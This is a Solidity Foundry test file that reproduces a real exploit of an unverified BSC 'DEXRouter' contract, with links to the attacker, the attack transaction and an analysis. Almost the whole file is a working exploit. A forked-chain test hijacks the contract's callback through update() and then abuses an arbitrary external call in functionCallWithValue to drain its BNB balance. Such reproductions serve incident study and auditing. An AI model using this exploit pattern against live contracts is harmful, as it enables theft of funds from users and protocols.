// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~4K USD$
// Attacker : https://bscscan.com/address/0x09039e2082a0a815908e68bd52b86f96573768e8
// Attack Contract : https://bscscan.com/address/0x0f41f9146de354e5ac6bb3996e2e319dc8a3bb7f
// Victim Contract : https://bscscan.com/address/0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7
// Attack Tx : https://bscscan.com/tx/0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113

// @Analysis
// https://twitter.com/DecurityHQ/status/1707851321909428688

interface IDEXRouter {
    function update(address fcb, address bnb, address busd, address router) external;

    function functionCallWithValue(address target, bytes memory data, uint256 value) external;
}

contract ContractTest is Test {
    // Victim unverified contract. Name "DEXRouter" taken from parameter name in "go" function in attack contract
    IDEXRouter private constant DEXRouter = IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);

    function setUp() public {
        vm.createSelectFork("bsc", 32_161_325);
        vm.label(address(DEXRouter), "DEXRouter");
    }

    function testExploit() public {
        deal(address(this), 0 ether);
        emit log_named_decimal_uint("Attacker BNB balance before exploit", address(this).balance, 18);
        // DEXRouter will call back to function with selector "0xe44a73b7". Look at fallback function
        DEXRouter.update(address(this), address(this), address(this), address(this));

        // Arbitrary external call vulnerability here. DEXRouter will call back "a" payable function and next transfer BNB to this contract
        DEXRouter.functionCallWithValue(address(this), abi.encodePacked(this.a.selector), address(DEXRouter).balance);

        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
    }

    function a() external payable returns (bool) {
        return true;
    }

    fallback(bytes calldata data) external payable returns (bytes memory) {
        if (bytes4(data) == bytes4(0xe44a73b7)) {
            return abi.encode(true);
        }
    }
}
